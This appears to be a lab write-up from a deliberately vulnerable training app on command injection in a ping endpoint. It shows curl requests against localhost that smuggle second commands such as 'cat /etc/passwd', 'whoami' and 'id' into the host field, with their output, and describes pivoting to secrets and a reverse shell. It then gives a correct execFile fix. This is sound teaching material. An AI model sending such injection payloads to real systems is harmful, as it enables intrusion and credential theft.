# Lab 16: Command injection in network diagnostics

The ping tool concatenates the `host` parameter into a shell command run with `exec`. The shell interprets everything after `;`, `&&`, `|`, `$()` or backticks.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/) (CWE-78)

**Code:** `routes/extras.js` (`/tools/ping`)

## Exploit

1. Normal usage (log in first — `/tools` requires a session):

```bash
curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
  -d "username=alice" -d "password=alice123"

curl -s -b cookies.txt -X POST http://localhost:8888/tools/ping \
  --data "host=127.0.0.1" | sed -n '/<pre/,/<\/pre>/p'
# PING 127.0.0.1 ... 2 packets transmitted, 2 received
```

2. Inject a second command with `;`:

```bash
curl -s -b cookies.txt -X POST http://localhost:8888/tools/ping \
  --data-urlencode 'host=127.0.0.1; cat /etc/passwd' | sed -n '/<pre/,/<\/pre>/p'
# PING 127.0.0.1 ...
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

3. Other separators that work identically:

```bash
host=127.0.0.1 && whoami            # root
host=127.0.0.1 | id
host=$(cat /etc/hostname)
host=`ls /app`
```

The web process runs as root in the container, so this is arbitrary code execution inside the app container. From here an attacker pivots: read the Postgres password from the environment, scan the compose network (lab 02's IMDS and vault are at fixed hostnames), or plant a reverse shell.

## Why it happens

`exec()` spawns `/bin/sh -c <string>` — the whole string is shell grammar. Any metacharacter in "data" becomes structure.

## Fix

Never touch a shell. Use `execFile` with an argv array:

```js
const { execFile } = require("child_process");
execFile("ping", ["-c", "2", host], { timeout: 6000 }, (err, stdout) => { ... });
// host stays a single argument — "; cat /etc/passwd" is just an invalid hostname
```

Or drop the binary entirely: Node has `net.Socket` for TCP checks and `dns.promises` for lookups — no shell, no binary, no attack surface. If hostnames must be validated, use a strict allowlist (`^[a-zA-Z0-9.-]+$`) as a second layer, never as the only one.

## Verify

After the fix, `; cat /etc/passwd` returns a ping error for an invalid host — and the second command never runs.

Related: path traversal on the download endpoint — lab 15.